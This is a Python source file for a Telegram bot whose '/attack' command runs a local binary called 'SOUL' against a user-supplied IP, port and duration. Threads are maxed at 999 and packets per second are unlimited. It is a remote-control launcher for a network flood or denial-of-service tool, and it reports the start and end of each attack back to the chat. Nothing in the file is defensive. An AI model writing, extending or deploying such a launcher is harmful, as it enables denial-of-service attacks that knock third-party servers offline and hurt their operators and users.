import os
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import config  # contains BOT_TOKEN and USER_ID

# ---------------- Configuration ----------------
AUTHORIZED_USERS = [str(config.USER_ID)]
MAX_THREADS = "999"
MAX_PPS = "-1"  # unlimited packets per second

# ---------------- Commands ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚡ Welcome! Use /attack <IP> <PORT> <DURATION> to start SOUL attacks.\n"
        "Threads and PPS are automatically maxed."
    )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("❌ You are not authorized to run commands.")
        return

    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Usage: /attack <IP> <PORT> <DURATION>")
        return

    ip, port, duration = args

    try:
        soul_path = os.path.join(os.getcwd(), "SOUL")
        if not os.path.exists(soul_path):
            await update.message.reply_text("❌ SOUL binary not found in the bot directory.")
            return

        # Make SOUL executable
        os.chmod(soul_path, 0o755)

        # Notify attack start
        await update.message.reply_text(
            f"⚡ Attack started on {ip}:{port} for {duration} seconds."
        )

        # Run SOUL as a subprocess and wait for it to finish
        process = await asyncio.create_subprocess_exec(
            soul_path, ip, str(port), str(duration), MAX_THREADS, MAX_PPS,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        # Wait for SOUL to finish
        stdout, stderr = await process.communicate()

        # Prepare debug info if any
        debug_msg = ""
        if stdout:
            debug_msg += f"SOUL stdout:\n{stdout.decode()}\n"
        if stderr:
            debug_msg += f"SOUL stderr:\n{stderr.decode()}\n"

        # Notify attack end
        await update.message.reply_text(
            f"✅ Attack on {ip}:{port} for {duration} seconds completed.\n\n{debug_msg}"
        )

    except Exception as e:
        await update.message.reply_text(f"❌ Failed to start attack: {str(e)}")

# ---------------- Main Bot ----------------
if __name__ == "__main__":
    app = ApplicationBuilder().token(config.BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))

    print("Spike bot is running...")
    app.run_polling()
